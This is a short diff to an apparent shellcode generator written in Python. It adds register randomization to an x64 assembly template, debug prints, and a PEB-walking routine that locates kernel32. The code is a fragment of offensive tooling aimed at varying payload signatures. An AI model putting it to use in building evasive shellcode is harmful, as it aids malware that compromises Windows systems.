@@ -69,10 +69,17 @@ class Shellcode():
         """
 
         if self.randomize_regs:
-            self.map.exclusion_list = ["rsp", "rax", "rbp"]
+            self.map.exclusion_list = ["rsp", "rax", "rbp", "rdx"]
             full_map = self.map.get_full_mapping()
             rcx, r8, rdi, rsi = self.map.gen_regs(4, 64)
+
+            print(f"RCX => {rcx}")
+            print(f"R8  => {r8}")
+            print(f"RDI => {rdi}")
+            print(f"RSI => {rsi}")
+
             rax = "rax"
+
             cx = full_map[rcx][1]
             dl = self.map.gen_regs(1, 8)[0]
         else:
@@ -98,7 +105,7 @@ class Shellcode():
 ; }}
 
 getKernel32:
-    mov {dl}, 0x4b
+    mov dl, 0x4b
 getPEB:
     mov {rcx}, 0x60
     mov {r8}, gs:[{rcx}]
@@ -112,7 +119,7 @@ search:
     mov {rdi}, [{rdi}]
     cmp [{rsi} + 0x18], {cx}
     jne search
-    cmp [{rsi}], {dl}
+    cmp [{rsi}], dl
     jne search
     ret
         """
